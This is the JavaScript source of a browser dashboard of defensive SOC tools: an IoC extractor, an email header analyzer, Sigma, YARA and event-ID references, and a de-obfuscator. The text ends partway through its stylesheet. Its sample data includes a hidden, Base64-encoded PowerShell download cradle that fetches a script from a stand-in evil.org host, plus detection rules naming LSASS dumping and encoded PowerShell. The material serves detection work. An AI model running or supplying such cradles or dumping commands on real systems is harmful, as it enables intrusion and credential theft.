/* Privacy Skill Vault — SOC & Security Tools Dashboard (Exact Match to Reference UI) */
(function () {
  "use strict";

  const CATEGORIES = [
    { id: "all", label: "All Tools", icon: "grid" },
    { id: "soc", label: "SOC & Detection", icon: "shield" },
    { id: "ti", label: "Threat Intelligence", icon: "globe" },
    { id: "dfir", label: "DFIR & Forensics", icon: "file" },
    { id: "network", label: "Network & Email", icon: "network" },
    { id: "util", label: "Decoders & Governance", icon: "terminal" }
  ];

  const ICONS = {
    grid: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>`,
    shield: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>`,
    globe: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>`,
    file: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><circle cx="11.5" cy="14.5" r="2.5"/><line x1="13.5" y1="16.5" x2="15.5" y2="18.5"/></svg>`,
    network: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><polyline points="6 10 9 10 11 7 13 13 15 10 18 10"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`,
    terminal: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
    code: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><polyline points="8 10 6 12 8 14"/><polyline points="16 10 18 12 16 14"/><line x1="13" y1="9" x2="11" y2="15"/></svg>`,
    bug: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="6"/><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/></svg>`,
    nodes: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="6" cy="6" r="3"/><circle cx="18" cy="6" r="3"/><circle cx="12" cy="18" r="3"/><line x1="8.5" y1="7.5" x2="10.5" y2="15.5"/><line x1="15.5" y1="7.5" x2="13.5" y2="15.5"/></svg>`,
    lock: `<svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`
  };

  const TOOLS = [
    {
      id: "ioc",
      cat: "ti",
      icon: "nodes",
      title: "Bulk IoC Extractor & Defanger",
      desc: "Extract IPs, domains, URLs, emails, CVEs and file hashes from raw logs and defang indicators safely.",
      tags: ["Threat Intel", "IOC", "Defang", "Parser"],
      features: ["Extracts IPv4, Domains, URLs, Emails, SHA256, MD5 & CVEs", "Automatic safe defanging (hxxps / [.])", "Deduplicates noisy firewall and proxy logs", "Works 100% locally in your browser"],
      sampleName: "Sample: Phishing & C2 Proxy Log",
      sampleQuery: 'source="proxy.log" | action="extract_ioc" | defang=true',
      sample: `2026-10-17 10:14:23 WKSTN-FIN-09 src=10.24.18.44 dst=185.220.101.42 url=https://login-gateway.evil-pay-verify.com/stage2/payload.ps1 user=admin
2026-10-17 10:15:07 SRV-DC01 src=10.10.0.5 dst=45.155.205.233 sender=urgent-alert@sec-account-verify.org cve=CVE-2024-21412
2026-10-17 10:16:11 WKSTN-HR-02 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 md5=44d88612fea8a8f36de82e1278abb02f`
    },
    {
      id: "ti",
      cat: "ti",
      icon: "globe",
      title: "Multi-Source Threat Intel Hub",
      desc: "Enrich IPs, domains, URLs and file hashes with live Shodan InternetDB, RDAP, DNS and reputation sources.",
      tags: ["Threat Intel", "IOC", "Enrichment", "Reputation"],
      features: ["Live Shodan InternetDB open ports & CVE lookup", "Live RDAP ASN, CIDR and registrar ownership", "Cloudflare DoH DNS record resolution", "One-click pivot to VirusTotal, AbuseIPDB & URLScan"],
      sampleName: "Sample: Public Resolver / Target IP",
      sampleQuery: 'indicator="1.1.1.1" | modules="shodan,rdap,dns,reputation"',
      sample: "1.1.1.1"
    },
    {
      id: "headers",
      cat: "network",
      icon: "code",
      title: "Email Header Analyzer",
      desc: "Inspect and analyze raw SMTP routing headers, hop delays, and SPF/DKIM/DMARC authentication signals.",
      tags: ["Email Security", "Phishing", "Headers", "DMARC"],
      features: ["Chronological SMTP hop-by-hop trace table", "SPF, DKIM, and DMARC alignment verification", "Detects Reply-To vs From spoofing anomalies", "Extracts X-Originating-IP automatically"],
      sampleName: "Sample: Spoofed Phishing Email Header",
      sampleQuery: 'header="SMTP" | verify="spf,dkim,dmarc" | detect="reply_to_mismatch"',
      sample: `Return-Path: <security-notice@paypa1-support-alert.com>
Received: from mail.internal-gateway.local (10.10.2.15) by mx.enterprise.org with ESMTPS id 991A2B; Sat, 17 Oct 2026 14:22:45 +0000
Received: from relay-out.bulletproof-host.net ([185.193.125.44]) by mail.internal-gateway.local with ESMTP; Sat, 17 Oct 2026 14:22:11 +0000
From: "Corporate Helpdesk" <admin@enterprise.org>
Reply-To: <collect-credentials@paypa1-support-alert.com>
Subject: URGENT: Mandatory MFA Token Re-synchronization Required
X-Originating-IP: [91.215.85.19]
Authentication-Results: mx.enterprise.org; spf=fail smtp.mailfrom=paypa1-support-alert.com; dkim=fail; dmarc=fail action=quarantine`
    },
    {
      id: "sigma",
      cat: "soc",
      icon: "shield",
      title: "Sigma Rule Validator & Translator",
      desc: "Validate Sigma rules, check YAML syntax and translate detections into Elastic KQL, Splunk SPL & Sentinel.",
      tags: ["Detection", "Sigma", "Rule Engineering", "Blue Team"],
      features: ["Translates Sigma YAML to Elastic KQL, Splunk SPL & Sentinel KQL", "Supports selection, filter and string modifiers", "Maps standard Sigma fields to ECS & CIM schemas", "Pre-loaded with high-severity SOC detection templates"],
      sampleName: "Sample: LSASS Memory Dump via Comsvcs.dll",
      sampleQuery: 'sigma_rule="lsass_comsvcs_dump.yml" | target="elastic,splunk,sentinel"',
      sample: `title: Suspicious LSASS Memory Dump via Comsvcs.dll
id: a1b2c3d4-9912-4e11-8821-ff0011223344
status: production
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains|all:
      - 'comsvcs.dll'
      - 'MiniDump'
  filter:
    User|contains: 'AUTHORITY\\SYSTEM'
  condition: selection and not filter
level: critical`
    },
    {
      id: "events",
      cat: "soc",
      icon: "file",
      title: "Windows & Sysmon Event Encyclopedia",
      desc: "Search Windows Security and Sysmon Event IDs with XML field schemas, MITRE ATT&CK tags and hunting queries.",
      tags: ["SOC", "Windows Events", "Sysmon", "Hunting"],
      features: ["Covers critical Windows Security & Sysmon IDs (4624, 4625, 4688, ID 1, 3, 10, 22)", "Includes LogonType & failure SubStatus reference", "Ready-to-run Elastic KQL hunting queries", "False-positive tuning guidance for production SIEMs"],
      sampleName: "Sample: Kerberos & Logon Events",
      sampleQuery: 'search="4624" | source="Windows Security, Sysmon"',
      sample: "4624"
    },
    {
      id: "regex",
      cat: "soc",
      icon: "file",
      title: "Log Analyzer & Regex Sandbox",
      desc: "Analyze and search security logs quickly with named regex capture groups, field filters and structured table view.",
      tags: ["SOC", "Log Analysis", "Detection", "Parser"],
      features: ["Supports common log formats (CEF, Syslog, Auth, JSON)", "Named regex capture group extraction table", "Field-based highlighting and filtering", "Works completely in your browser"],
      sampleName: "Sample: Failed Login Attempts (Auth / CEF Log)",
      sampleQuery: 'source=auth.log | level=ERROR | message="Failed password"',
      sample: `PATTERN::(?<time>\\d{4}-\\d{2}-\\d{2}\\s+[\\d:]+)\\s+(?<host>\\S+)\\s+sshd\\[\\d+\\]:\\s+(?<message>Failed password for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+))
LOG::2026-10-16 10:14:23 server01 sshd[2190]: Failed password for invalid user root from 203.0.113.45 port 51234 ssh2
2026-10-16 10:15:07 server01 sshd[2194]: Failed password for admin from 198.51.100.23 port 49112 ssh2
2026-10-16 10:16:11 server02 sshd[8812]: Failed password for invalid user oracle from 192.0.2.10 port 38291 ssh2
2026-10-16 10:18:45 server01 sshd[2209]: Failed password for saju from 203.0.113.77 port 55100 ssh2
2026-10-16 10:19:02 server03 sshd[4410]: Failed password for invalid user ubuntu from 198.51.100.88 port 41009 ssh2`
    },
    {
      id: "yara",
      cat: "dfir",
      icon: "shield",
      title: "YARA Rule Builder & Linter",
      desc: "Generate structured YARA rules with PE header checks, hex wildcards, and live syntax validation.",
      tags: ["DFIR", "Malware", "YARA", "Detection"],
      features: ["Validates rule identifiers, strings and condition blocks", "Includes MZ/PE header and filesize presets", "Supports ASCII, wide, nocase and fullword modifiers", "Instant copyable .yar output"],
      sampleName: "Sample: CobaltStrike Beacon Loader Rule",
      sampleQuery: 'rule="Detect_CobaltStrike_Beacon" | check="uint16(0) == 0x5A4D"',
      sample: `RULE_NAME::Detect_CobaltStrike_Beacon_Loader
META_AUTHOR::SOC Detection Engineering
META_SEVERITY::Critical
STRINGS::
$s1 = "powershell.exe -nop -w hidden -enc" ascii wide nocase
$s2 = "ReflectiveLoader" ascii fullword
$hex1 = { 4D 5A 90 00 03 00 00 00 [4-16] 50 45 00 00 }
CONDITION::uint16(0) == 0x5A4D and filesize < 5MB and ($hex1 or all of ($s*))`
    },
    {
      id: "deobfuscator",
      cat: "dfir",
      icon: "terminal",
      title: "Safe Script De-obfuscator",
      desc: "Decode obfuscated PowerShell -EncodedCommand (UTF-16LE), Base64, Hex and URL strings without executing code.",
      tags: ["DFIR", "Deobfuscation", "PowerShell", "Malware"],
      features: ["Decodes UTF-16LE PowerShell -EncodedCommand payloads", "Extracts embedded C2 URLs and staging domains", "Flags dangerous functions (IEX, DownloadString, VirtualAlloc)", "Zero script execution risk"],
      sampleName: "Sample: Encoded PowerShell Download Cradle",
      sampleQuery: 'input="powershell -enc ..." | encoding="utf16le_base64"',
      sample: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AYwAyAC4AZQB2AGkAbAAuAG8AcgBnAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA`
    },
    {
      id: "json",
      cat: "dfir",
      icon: "code",
      title: "JSON Log & Alert Beautifier",
      desc: "Validate, pretty-print, and flatten nested Elastic ECS, Sysmon, and AWS CloudTrail JSON logs locally.",
      tags: ["Log Analysis", "JSON", "ECS", "SIEM"],
      features: ["Pretty-prints minified single-line SIEM JSON alerts", "Extracts key-value summary table for rapid triage", "Validates JSON syntax and highlights errors", "100% client-side processing"],
      sampleName: "Sample: Elastic Sysmon Process Creation Alert",
      sampleQuery: 'format="json" | schema="ecs" | action="beautify"',
      sample: `{"@timestamp":"2026-10-17T15:04:22.419Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"SRV-DC01.corp.local","ip":"10.10.0.5"},"process":{"pid":6412,"executable":"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe","command_line":"wmic process call create powershell.exe"},"user":{"name":"svc_backup"},"threat":{"tactic":"Execution","technique":"T1047"}}`
    },
    {
      id: "timestamp",
      cat: "util",
      icon: "terminal",
      title: "Multi-Timezone Timestamp Converter",
      desc: "Convert Unix Epoch (s/ms), Windows FileTime/LDAP 18-digit timestamps and ISO-8601 strings across timezones.",
      tags: ["DFIR", "Forensics", "Timestamps", "Utilities"],
      features: ["Supports Unix Epoch seconds & milliseconds", "Converts 18-digit Windows Active Directory FileTime", "Outputs UTC, Local Analyst Time, and ISO-8601", "Essential for multi-source timeline reconstruction"],
      sampleName: "Sample: Forensic Epoch Timestamp",
      sampleQuery: 'epoch=1760713462 | convert="utc,local,filetime"',
      sample: "1760713462"
    },
    {
      id: "severity",
      cat: "util",
      icon: "shield",
      title: "Incident Severity Calculator",
      desc: "Calculate transparent SOC incident priority (P1–P4), SLA response windows and immediate containment steps.",
      tags: ["IR", "Triage", "SLA", "Governance"],
      features: ["Scores Asset Criticality, Data Sensitivity & Scope", "Outputs P1–P4 Priority Rating and numeric risk score", "Generates immediate containment checklist", "Standardizes analyst escalation decisions"],
      sampleName: "Sample: Domain Controller Lateral Movement",
      sampleQuery: 'asset="tier1_dc" | scope="multi_host_lateral" | data="regulated_pii"',
      sample: `ASSET_CRITICALITY::tier1_dc
DATA_SENSITIVITY::regulated_pii
COMPROMISE_SCOPE::multi_host_lateral
THREAT_STATUS::active_c2_exfil`
    },
    {
      id: "report",
      cat: "util",
      icon: "file",
      title: "Incident Report Generator",
      desc: "Draft standardized executive and technical SOC incident reports in clean, copy-ready Markdown.",
      tags: ["IR", "Reporting", "SOC", "Documentation"],
      features: ["Structured Executive Summary, Timeline & MITRE sections", "Automatically defangs all indicators in the final report", "Ready to paste into Jira, ServiceNow or TheHive", "Zero data leaves your browser"],
      sampleName: "Sample: P1 Credential Dumping Incident",
      sampleQuery: 'incident="INC-2026-10492" | format="markdown_report"',
      sample: `INCIDENT_ID::INC-2026-10492
TITLE::Unauthorized Credential Dumping & Lateral Movement on SRV-FIN-02
SEVERITY::P1 - Critical
AFFECTED_ASSETS::SRV-FIN-02 (10.20.4.19), WKSTN-HR-11 (10.20.8.44), Account: corp\\svc_sql
MITRE_TACTICS::TA0006 Credential Access (T1003.001), TA0008 Lateral Movement (T1021.002)
TIMELINE::2026-10-17 13:10 UTC - Phishing link executed on WKSTN-HR-11 | 13:18 UTC - LSASS dump detected | 13:31 UTC - Hosts isolated in EDR
IOCS::185.220.101.42, https://evil-pay-verify.com/stage2.ps1
CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sql credentials twice.`
    },
    {
      id: "cvss",
      cat: "network",
      icon: "bug",
      title: "CVE & CVSS v3.1 Calculator",
      desc: "Calculate official CVSS v3.1 Base, Temporal and Environmental scores and inspect vector breakdowns.",
      tags: ["Vulnerability", "CVE", "CVSS", "Threat Intel"],
      features: ["Implements official FIRST.org CVSS v3.1 math & rounding", "Calculates Base, Temporal, and Impact/Exploitability sub-scores", "Parses any CVSS:3.1/... vector string instantly", "Maps score to Low / Medium / High / Critical severity"],
      sampleName: "Sample: Critical RCE Vector (Scope Changed)",
      sampleQuery: 'vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"',
      sample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C"
    }
  ];

  const EVENT_DB = [
    { id: "4624", source: "Windows Security", title: "Successful Account Logon", mitre: "T1078 / T1021", fields: "TargetUserName, IpAddress, LogonType (2=Interactive, 3=Network, 10=RDP)", kql: 'event.code: "4624" and winlog.event_data.LogonType: ("3" or "10")' },
    { id: "4625", source: "Windows Security", title: "Failed Account Logon", mitre: "T1110 (Brute Force)", fields: "TargetUserName, IpAddress, SubStatus (0xC000006A=Bad Password)", kql: 'event.code: "4625" and not winlog.event_data.TargetUserName: *$' },
    { id: "4688", source: "Windows Security", title: "New Process Created", mitre: "T1059", fields: "NewProcessName, CommandLine, ParentProcessName", kql: 'event.code: "4688" and process.command_line: (*-enc* or *comsvcs*)' },
    { id: "4697", source: "Windows Security", title: "Service Installed in System", mitre: "T1543.003", fields: "ServiceName, ServiceFileName, SubjectUserName", kql: 'event.code: "4697" and winlog.event_data.ServiceFileName: (*cmd* or *powershell*)' },
    { id: "4769", source: "Windows Security", title: "Kerberos Service Ticket Requested", mitre: "T1558.003 (Kerberoasting)", fields: "ServiceName, TicketEncryptionType (0x17=RC4)", kql: 'event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17"' },
    { id: "1", source: "Sysmon", title: "Process Creation (Sysmon ID 1)", mitre: "T1059", fields: "Image, CommandLine, ParentImage, Hashes", kql: 'event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"' },
    { id: "3", source: "Sysmon", title: "Network Connection (Sysmon ID 3)", mitre: "T1071", fields: "Image, SourceIp, DestinationIp, DestinationPort", kql: 'event.code: "3" and process.executable: (*rundll32* or *certutil*)' },
    { id: "10", source: "Sysmon", title: "Process Accessed / LSASS Dump (Sysmon ID 10)", mitre: "T1003.001", fields: "SourceImage, TargetImage (lsass.exe), GrantedAccess", kql: 'event.code: "10" and winlog.event_data.TargetImage: *lsass.exe' },
    { id: "22", source: "Sysmon", title: "DNS Query Event (Sysmon ID 22)", mitre: "T1071.004", fields: "Image, QueryName, QueryResults", kql: 'event.code: "22" and not process.executable: *chrome.exe' }
  ];

  let activeCat = "all";
  let searchQuery = "";
  let activeToolId = "regex";
  let activeTab = "overview";

  function esc(str) {
    return String(str || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function defang(text) {
    return String(text || "").replace(/https?:\/\//gi, m => m.replace(/t/gi, "x")).replace(/\./g, "[.]");
  }

  function injectDashboardStyles() {
    /* Neutralize old conflicting tools.css stylesheets so our clean Reference UI renders identically */
    document.querySelectorAll('link[href*="tools.css"], link[href*="psv-tools.css"], link[href*="soc-workbench.css"]').forEach(el => {
      el.disabled = true;
    });

    if (document.getElementById("psv-ref-dashboard-css")) return;
    const style = document.createElement("style");
    style.id = "psv-ref-dashboard-css";
    style.textContent = `
      .md-grid { max-width: 1460px !important; width: 96% !important; }
      .md-content__inner { margin: 0 !important; padding: 0 !important; max-width: 100% !important; }
      .md-content__inner > h1:first-child { display: none !important; }
      .md-sidebar--primary, .md-sidebar--secondary { display: none !important; }
      body, .md-main { background: #060b16 !important; }
      [data-md-color-scheme="default"] body, [data-md-color-scheme="default"] .md-main { background: #f1f5f9 !important; }

      #psv-dashboard {
        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #e2e8f0;
        padding: 1rem 0 3.5rem 0;
      }
      [data-md-color-scheme="default"] #psv-dashboard { color: #0f172a; }

      /* Top Dashboard Header Bar (Matches Reference Image 2) */
      .psv-top-bar {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: space-between;
        gap: 1.25rem;
        padding: 1rem 1.35rem;
        margin-bottom: 1.15rem;
        border-radius: 12px;
        background: linear-gradient(180deg, rgba(13, 22, 42, 0.95), rgba(8, 14, 28, 0.95));
        border: 1px solid rgba(59, 130, 246, 0.22);
        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
      }
      [data-md-color-scheme="default"] .psv-top-bar {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 4px 16px rgba(15, 23, 42, 0.06);
      }
      .psv-brand-group {
        display: flex;
        align-items: center;
        gap: 1.25rem;
      }
      .psv-brand-logo {
        display: flex;
        align-items: center;
        gap: 0.75rem;
      }
      .psv-shield-icon {
        width: 42px;
        height: 42px;
        border-radius: 10px;
        background: rgba(37, 99, 235, 0.16);
        border: 1px solid rgba(59, 130, 246, 0.4);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #3b82f6;
      }
      .psv-shield-icon svg { width: 24px; height: 24px; }
      .psv-brand-title {
        font-size: 1.35rem;
        font-weight: 800;
        letter-spacing: 0.02em;
        line-height: 1.1;
        color: #ffffff;
      }
      [data-md-color-scheme="default"] .psv-brand-title { color: #0f172a; }
      .psv-brand-title span { color: #3b82f6; }
      .psv-brand-domain {
        font-size: 0.76rem;
        color: #94a3b8;
        font-family: "JetBrains Mono", monospace;
      }
      .psv-brand-divider {
        width: 1px;
        height: 34px;
        background: rgba(148, 163, 184, 0.2);
      }
      .psv-brand-tagline {
        font-size: 0.88rem;
        color: #cbd5e1;
        line-height: 1.35;
      }
      [data-md-color-scheme="default"] .psv-brand-tagline { color: #475569; }

      .psv-search-wrap {
        flex: 1;
        max-width: 540px;
        min-width: 260px;
        position: relative;
      }
      .psv-search-input {
        width: 100%;
        padding: 0.68rem 1rem 0.68rem 2.4rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: rgba(6, 11, 22, 0.85);
        color: #f8fafc;
        font-size: 0.86rem;
        outline: none;
      }
      [data-md-color-scheme="default"] .psv-search-input {
        background: #f8fafc;
        border-color: #cbd5e1;
        color: #0f172a;
      }
      .psv-search-input:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
      }
      .psv-search-icon {
        position: absolute;
        left: 0.8rem;
        top: 50%;
        transform: translateY(-50%);
        color: #64748b;
        pointer-events: none;
      }

      /* Category Pills Row */
      .psv-cat-row {
        display: flex;
        flex-wrap: wrap;
        gap: 0.6rem;
        margin-bottom: 1.25rem;
      }
      .psv-cat-pill {
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        padding: 0.52rem 0.95rem;
        border-radius: 9px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: rgba(13, 22, 42, 0.85);
        color: #cbd5e1;
        font-size: 0.82rem;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.15s ease;
      }
      [data-md-color-scheme="default"] .psv-cat-pill {
        background: #ffffff;
        border-color: #cbd5e1;
        color: #334155;
      }
      .psv-cat-pill svg { width: 15px; height: 15px; color: #60a5fa; }
      .psv-cat-pill:hover { border-color: #3b82f6; color: #ffffff; }
      [data-md-color-scheme="default"] .psv-cat-pill:hover { color: #0f172a; }
      .psv-cat-pill.active {
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        border-color: #3b82f6;
        color: #ffffff !important;
        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
      }
      .psv-cat-pill.active svg { color: #ffffff; }
      .psv-cat-count {
        padding: 0.1rem 0.45rem;
        border-radius: 6px;
        background: rgba(255, 255, 255, 0.15);
        font-size: 0.72rem;
        font-weight: 700;
      }

      /* 3-Column Tool Cards Grid */
      .psv-cards-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 1rem;
        margin-bottom: 1.5rem;
      }
      @media (max-width: 1100px) { .psv-cards-grid { grid-template-columns: repeat(2, 1fr); } }
      @media (max-width: 700px) { .psv-cards-grid { grid-template-columns: 1fr; } }

      .psv-card {
        border-radius: 12px;
        border: 1px solid rgba(59, 130, 246, 0.22);
        background: linear-gradient(180deg, rgba(13, 23, 44, 0.92), rgba(8, 15, 30, 0.95));
        padding: 1.15rem 1.25rem;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        transition: all 0.18s ease;
        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.32);
      }
      [data-md-color-scheme="default"] .psv-card {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 2px 10px rgba(15, 23, 42, 0.05);
      }
      .psv-card:hover, .psv-card.active-card {
        border-color: #3b82f6;
        box-shadow: 0 0 0 1px rgba(59, 130, 246, 0.45), 0 10px 28px rgba(29, 78, 216, 0.22);
      }
      .psv-card-top {
        display: flex;
         gap: 1rem;
        align-items: flex-start;
      }
      .psv-card-icon {
        width: 48px;
        height: 48px;
        flex-shrink: 0;
        border-radius: 10px;
        background: rgba(37, 99, 235, 0.12);
        border: 1px solid rgba(59, 130, 246, 0.32);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #3b82f6;
      }
      .psv-card-icon svg { width: 26px; height: 26px; }
      .psv-card-title {
        font-size: 1.08rem;
        font-weight: 700;
        color: #ffffff;
        margin: 0 0 0.3rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-title { color: #0f172a; }
      .psv-card-desc {
        font-size: 0.81rem;
        color: #94a3b8;
        line-height: 1.45;
        margin: 0 0 0.75rem 0;
      }
      [data-md-color-scheme="default"] .psv-card-desc { color: #475569; }
      .psv-tag-row {
        display: flex;
        flex-wrap: wrap;
        gap: 0.35rem;
        margin-bottom: 1rem;
      }
      .psv-tag {
        padding: 0.18rem 0.55rem;
        border-radius: 5px;
        background: rgba(30, 41, 59, 0.85);
        border: 1px solid rgba(148, 163, 184, 0.2);
        color: #cbd5e1;
        font-size: 0.71rem;
        font-weight: 600;
      }
      [data-md-color-scheme="default"] .psv-tag {
        background: #f1f5f9;
        border-color: #cbd5e1;
        color: #334155;
      }
      .psv-card-footer {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 0.75rem;
        padding-top: 0.75rem;
        border-top: 1px solid rgba(148, 163, 184, 0.12);
      }
      .psv-open-btn {
        padding: 0.48rem 1.05rem;
        border-radius: 7px;
        background: linear-gradient(135deg, #2563eb, #1d4ed8);
        color: #ffffff !important;
        font-size: 0.8rem;
        font-weight: 700;
        border: none;
        cursor: pointer;
        white-space: nowrap;
        box-shadow: 0 3px 10px rgba(37, 99, 235, 0.35);
      }
      .psv-open-btn:hover { background: #1e40af; }
      .psv-privacy-note {
        display: flex;
        align-items: center;
        gap: 0.45rem;
        font-size: 0.71rem;
        color: #94a3b8;
        line-height: 1.25;
      }
      .psv-privacy-note svg { width: 15px; height: 15px; flex-shrink: 0; }
      .psv-privacy-note strong { color: #cbd5e1; display: block; }
      [data-md-color-scheme="default"] .psv-privacy-note strong { color: #334155; }

      /* Bottom Split-Pane Interactive Workbench (Exact Reference Image 2 Lower Section) */
      .psv-workbench-shell {
        display: grid;
        grid-template-columns: 250px 1fr;
        gap: 1rem;
        border-radius: 12px;
        border: 1px solid rgba(59, 130, 246, 0.28);
        background: linear-gradient(180deg, rgba(10, 18, 36, 0.96), rgba(6, 11, 22, 0.98));
        padding: 1rem;
        box-shadow: 0 14px 38px rgba(0, 0, 0, 0.5);
      }
      [data-md-color-scheme="default"] .psv-workbench-shell {
        background: #ffffff;
        border-color: #cbd5e1;
        box-shadow: 0 6px 20px rgba(15, 23, 42, 0.06);
      }
      @media (max-width: 960px) { .psv-workbench-shell { grid-template-columns: 1fr; } }

      .psv-side-nav {
        border-right: 1px solid rgba(148, 163, 184, 0.14);
        padding-right: 0.85rem;
      }
      @media (max-width: 960px) { .psv-side-nav { border-right: none; padding-right: 0; } }
      .psv-side-header {
        font-size: 0.88rem;
        font-weight: 700;
        color: #ffffff;
        padding: 0.35rem 0.5rem 0.75rem 0.5rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
        margin-bottom: 0.6rem;
      }
      [data-md-color-scheme="default"] .psv-side-header { color: #0f172a; }
      .psv-side-list {
        display: flex;
        flex-direction: column;
        gap: 0.3rem;
      }
      .psv-side-item {
        display: flex;
        align-items: center;
        gap: 0.6rem;
        width: 100%;
        text-align: left;
        padding: 0.55rem 0.75rem;
        border-radius: 8px;
        border: 1px solid transparent;
        background: transparent;
        color: #cbd5e1;
        font-size: 0.81rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-side-item { color: #334155; }
      .psv-side-item svg { width: 16px; height: 16px; color: #3b82f6; flex-shrink: 0; }
      .psv-side-item:hover { background: rgba(59, 130, 246, 0.1); }
      .psv-side-item.active {
        background: linear-gradient(90deg, #1d4ed8, #2563eb);
        color: #ffffff !important;
      }
      .psv-side-item.active svg { color: #ffffff; }

      .psv-main-pane {
        padding: 0.25rem 0.5rem;
        overflow-x: hidden;
      }
      .psv-pane-top {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        justify-content: space-between;
        gap: 1rem;
        padding-bottom: 0.9rem;
        border-bottom: 1px solid rgba(148, 163, 184, 0.14);
        margin-bottom: 0.9rem;
      }
      .psv-pane-title-wrap {
        display: flex;
        align-items: center;
        gap: 0.85rem;
      }
      .psv-pane-title {
        font-size: 1.25rem;
        font-weight: 800;
        color: #ffffff;
        margin: 0;
      }
      [data-md-color-scheme="default"] .psv-pane-title { color: #0f172a; }
      .psv-pane-sub {
        font-size: 0.82rem;
        color: #94a3b8;
        margin: 0.15rem 0 0 0;
      }
      .psv-pane-controls {
        display: flex;
        align-items: center;
        gap: 1rem;
      }
      .psv-local-badge {
        display: flex;
        align-items: center;
        gap: 0.45rem;
        font-size: 0.75rem;
        color: #94a3b8;
      }
      .psv-local-badge strong { color: #10b981; display: block; }
      .psv-clear-btn {
        padding: 0.45rem 0.85rem;
        border-radius: 7px;
        border: 1px solid rgba(148, 163, 184, 0.25);
        background: rgba(15, 23, 42, 0.8);
        color: #cbd5e1;
        font-size: 0.78rem;
        font-weight: 600;
        cursor: pointer;
      }
      [data-md-color-scheme="default"] .psv-clear-btn {
        background: #f8fafc;
        color: #334155;
        border-color: #cbd5e1;
      }

      /* Tabs Bar (Overview | Input | Results | References) */
      .psv-tabs-bar {
        display: flex;
